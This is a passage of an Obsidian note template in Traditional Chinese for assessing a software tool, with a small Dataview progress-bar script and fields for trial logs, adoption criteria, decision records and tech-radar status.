>   const bar = "\u2588".repeat(Math.round(pct / 5)) + "\u2591".repeat(20 - Math.round(pct / 5));
>   dv.paragraph(`${bar} **${done}/${steps.length}** (${pct}%)`);
>   const todo = steps.filter(s => !s.done).map(s => s.name);
>   if (todo.length > 0) dv.paragraph("待完成：" + todo.join(" / "));
> }
> ```

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 測試環境 :: _OS / Node / Python 版本_
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 花費時間 :: _從零到可用_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 踩到的坑 :: _描述 + 解法_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 決策記錄

> [!abstract]- 為什麼評估這個工具？
> **當時的痛點**：_遇到什麼問題才開始找工具？_
> **觸發來源**：_GitHub Trending / HN / 同事推薦 / 其他_
> **當時的約束**：_時間 / 團隊 / 語言 / 部署環境_

> [!note]- 最終決策
> decision:: _選了什麼（或為何還在觀望）_
> why:: _當時的理由（越具體越好）_
> outcome:: _後來實際發生了什麼_

### 探索日誌

_按時間記錄，每次接觸時追加一段（最新在上）_

> **2026-03-10** — 首次收錄
> _第一印象：_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `ring_history`: 追加新狀態（格式：`assess@2026-03-10, trial@2026-03-15`）
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
